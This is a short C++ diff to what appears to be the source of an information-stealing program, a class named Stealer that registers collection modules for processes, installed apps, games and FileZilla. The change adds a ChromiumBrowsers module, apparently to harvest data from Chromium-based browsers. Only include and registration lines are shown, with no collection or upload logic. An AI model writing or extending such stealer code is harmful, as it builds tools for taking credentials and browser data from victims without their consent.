@@ -13,6 +13,7 @@
 #include "impl/games/Games.h"
 #include "impl/InstalledApps.h"
 #include "impl/FileZilla.h"
+#include "impl/brownsers/chromium/ChromiumBrowsers.h"
 #include <thread>
 
 void Stealer::registerModules() {
@@ -26,6 +27,7 @@ void Stealer::registerModules() {
     this->modules.push_back(new Processes());
     this->modules.push_back(new InstalledApps());
     this->modules.push_back(new FileZilla());
+    this->modules.push_back(new ChromiumBrowsers());
 }
 
 
